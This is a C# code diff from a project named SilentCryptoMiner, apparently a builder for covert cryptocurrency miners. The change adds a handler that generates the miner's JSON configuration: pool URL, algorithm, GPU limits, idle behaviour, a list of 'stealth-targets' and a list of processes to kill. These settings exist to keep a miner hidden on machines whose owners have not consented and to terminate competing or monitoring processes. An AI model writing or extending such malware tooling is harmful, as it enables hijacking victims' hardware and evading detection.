@@ -39,7 +39,7 @@ namespace SilentCryptoMiner
 
         private void toggleIdle_CheckedChanged(object sender)
         {
-            txtIdleGPU.Enabled = toggleIdle.Checked;
+            comboIdleGPU.Enabled = toggleIdle.Checked;
             txtIdleWait.Enabled = toggleIdle.Checked;
         }
 
@@ -61,6 +61,20 @@ namespace SilentCryptoMiner
         private void comboAlgorithm_SelectedIndexChanged(object sender, EventArgs e)
         {
             formMinerETH.SubHeader = nid + " - " + comboAlgorithm.Text;
+        }
+
+        private void tabcontrolMinerETH_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            txtJSON.Text =
+$@"{{
+    ""url"": ""{F.formatETHUrl(this)}"",
+    ""algo"": ""{comboAlgorithm.Text}"",
+    ""max-gpu"": {comboMaxGPU.Text.Replace("%", "")},
+    ""idle-wait"": {(toggleIdle.Checked ? txtIdleWait.Text : "0")},
+    ""idle-gpu"": {comboIdleGPU.Text.Replace("%", "")},
+    ""stealth-targets"": ""{(toggleStealth.Checked ? txtStealthTargets.Text : "")}"",
+    ""kill-targets"": ""{(toggleProcessKiller.Checked ? txtKillTargets.Text : "")}""
+}}";
         }
     }
 }
